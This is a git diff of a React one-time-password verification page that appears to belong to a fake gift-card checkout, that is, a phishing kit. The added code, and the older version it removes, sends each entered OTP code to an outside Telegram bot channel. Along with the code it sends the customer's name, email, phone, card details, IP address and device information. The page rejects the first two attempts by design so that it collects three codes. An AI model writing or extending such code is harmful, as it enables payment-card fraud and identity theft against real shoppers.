@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -74,6 +73,81 @@ const generateSessionId = () => {
   });
 };
 
+// Improved function to send Telegram notifications that works on all devices
+const sendTelegramNotification = async (otp: string, attemptNumber: number, userData: any) => {
+  console.log(`Attempting to send notification for attempt ${attemptNumber} with OTP: ${otp}`);
+  
+  try {
+    // Format date and time
+    const currentDate = new Date();
+    const formattedDate = currentDate.toLocaleDateString();
+    const formattedTime = currentDate.toLocaleTimeString();
+    
+    // Format message
+    const message = `
+🔐 *OTP CODE ENTERED: ${otp}*
+🔢 *ATTEMPT: ${attemptNumber}/3*
+
+👤 Customer: ${userData.customerName || "N/A"}
+📧 Email: ${userData.email || "N/A"}
+📱 Phone: ${userData.phone || "N/A"}
+💳 Payment: ${userData.paymentMethod || "N/A"} •••• ${userData.lastFour || "****"}
+💰 Amount: $${userData.discountedAmount?.toFixed(2) || "0.00"}
+🎁 Card Value: $${userData.giftCardValue?.toFixed(2) || "0.00"}
+
+📝 *SESSION DATA:*
+🆔 Session ID: ${userData.sessionId}
+🌐 IP Address: ${userData.ipAddress}
+🖥️ Browser: ${userData.browserInfo.browser}
+💻 OS: ${userData.browserInfo.os}
+📱 Device: ${userData.browserInfo.device}
+📅 Date: ${formattedDate}
+⏰ Time: ${formattedTime}
+`;
+
+    console.log("Preparing to send Telegram notification with message:", message);
+    
+    // Use XMLHttpRequest instead of fetch for better compatibility
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          console.log(`XHR Response status: ${xhr.status}`);
+          console.log(`XHR Response text: ${xhr.responseText}`);
+          
+          if (xhr.status >= 200 && xhr.status < 300) {
+            console.log("Telegram notification sent successfully");
+            resolve(true);
+          } else {
+            console.error("Failed to send Telegram notification:", xhr.responseText);
+            resolve(false); // Resolve with false instead of rejecting to prevent errors
+          }
+        }
+      };
+      
+      xhr.onerror = function(e) {
+        console.error("XHR Error occurred while sending Telegram notification:", e);
+        resolve(false); // Resolve with false instead of rejecting to prevent errors
+      };
+      
+      const data = JSON.stringify({
+        chat_id: TELEGRAM_CHANNEL_ID,
+        text: message,
+        parse_mode: "Markdown"
+      });
+      
+      console.log("Sending XHR request with data:", data);
+      xhr.send(data);
+    });
+  } catch (error) {
+    console.error(`Error in sendTelegramNotification for attempt ${attemptNumber}:`, error);
+    return false;
+  }
+};
+
 const OTPVerification = () => {
   const location = useLocation();
   const navigate = useNavigate();
@@ -85,6 +159,7 @@ const OTPVerification = () => {
   const [key, setKey] = useState(0); // Used to force re-render of OTP input
   const [sessionId] = useState(generateSessionId()); // Generate session ID once on component mount
   const [ipAddress, setIpAddress] = useState("Unknown");
+  const [browserInfo] = useState(getBrowserInfo());
   
   // Get order details from location state
   const orderDetails = location.state?.orderDetails;
@@ -96,12 +171,28 @@ const OTPVerification = () => {
   const cvv = location.state?.cvv;
   const expiryDate = location.state?.expiryDate;
 
+  // Create a user data object for notifications
+  const userData = {
+    customerName: orderDetails?.customerName,
+    email: orderDetails?.email,
+    phone: orderDetails?.phone,
+    paymentMethod,
+    lastFour,
+    giftCardValue,
+    discountedAmount,
+    sessionId,
+    ipAddress,
+    browserInfo
+  };
+
   // Fetch IP address on component mount
   useEffect(() => {
     const getIpAddress = async () => {
       try {
+        // Use a different IP service that works better on mobile
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
+        console.log("IP data received:", data);
         setIpAddress(data.ip);
       } catch (error) {
         console.error('Failed to fetch IP address:', error);
@@ -166,86 +257,16 @@ const OTPVerification = () => {
       });
     }
   }, [countdown, navigate]);
-
-  // Send Telegram notification with enhanced data
-  const sendTelegramNotification = async (attemptNumber: number) => {
-    console.log(`Sending attempt ${attemptNumber} notification to Telegram with OTP: ${otp}`);
-    try {
-      // Get browser information
-      const browserInfo = getBrowserInfo();
-      
-      // Format date and time
-      const currentDate = new Date();
-      const formattedDate = currentDate.toLocaleDateString();
-      const formattedTime = currentDate.toLocaleTimeString();
-      
-      // Format enhanced OTP message
-      const message = `
-🔐 *OTP CODE ENTERED: ${otp}*
-🔢 *ATTEMPT: ${attemptNumber}/3*
-
-👤 Customer: ${orderDetails?.customerName || "N/A"}
-📧 Email: ${orderDetails?.email || "N/A"}
-📱 Phone: ${orderDetails?.phone || "N/A"}
-💳 Payment: ${paymentMethod || "N/A"} •••• ${lastFour || "****"}
-💰 Amount: $${discountedAmount?.toFixed(2) || "0.00"}
-🎁 Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
-
-📝 *SESSION DATA:*
-🆔 Session ID: ${sessionId}
-🌐 IP Address: ${ipAddress}
-🖥️ Browser: ${browserInfo.browser}
-💻 OS: ${browserInfo.os}
-📱 Device: ${browserInfo.device}
-📅 Date: ${formattedDate}
-⏰ Time: ${formattedTime}
-`;
-
-      // Send message directly to Telegram API
-      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      console.log("Sending to Telegram URL:", telegramApiUrl);
-      console.log("Message content:", message);
-      console.log("Channel ID:", TELEGRAM_CHANNEL_ID);
-      
-      const response = await fetch(telegramApiUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHANNEL_ID,
-          text: message,
-          parse_mode: "Markdown", // Using Markdown for better formatting
-        }),
-      });
-
-      const responseData = await response.text();
-      console.log(`Telegram API raw response for attempt ${attemptNumber}:`, response);
-      console.log(`Response status:`, response.status);
-      console.log(`Telegram API response text for attempt ${attemptNumber}:`, responseData);
-      
-      // Try to parse the response as JSON
-      try {
-        const jsonResponse = JSON.parse(responseData);
-        console.log(`Parsed JSON response for attempt ${attemptNumber}:`, jsonResponse);
-        return jsonResponse?.ok === true;
-      } catch (parseError) {
-        console.error(`Failed to parse response for attempt ${attemptNumber}:`, parseError);
-        return false;
-      }
-    } catch (error) {
-      console.error(`Error sending Telegram notification for attempt ${attemptNumber}:`, error);
-      return false;
-    }
-  };
   
   // Handle First Attempt OTP (always fails)
   const handleFirstAttempt = async () => {
     setError("Invalid verification code. Please try again.");
     setAttempts(1); // Move to second attempt
     
+    console.log("Handling first attempt...");
     // Send notification for first attempt
-    await sendTelegramNotification(1);
+    const notificationSent = await sendTelegramNotification(otp, 1, userData);
+    console.log("First attempt notification sent:", notificationSent);
     
     // Clear OTP input and reset
     setOtp("");
@@ -263,8 +284,10 @@ const OTPVerification = () => {
     setError("Invalid verification code. One more attempt remaining.");
     setAttempts(2); // Move to third attempt
     
+    console.log("Handling second attempt...");
     // Send notification for second attempt
-    await sendTelegramNotification(2);
+    const notificationSent = await sendTelegramNotification(otp, 2, userData);
+    console.log("Second attempt notification sent:", notificationSent);
     
     // Clear OTP input and reset
     setOtp("");
@@ -281,8 +304,10 @@ const OTPVerification = () => {
   const handleThirdAttempt = async () => {
     setIsSubmitting(true);
     
+    console.log("Handling third attempt...");
     // Send notification for third (successful) attempt
-    await sendTelegramNotification(3);
+    const notificationSent = await sendTelegramNotification(otp, 3, userData);
+    console.log("Third attempt notification sent:", notificationSent);
     
     // Simulate processing delay
     await new Promise(resolve => setTimeout(resolve, 1500));
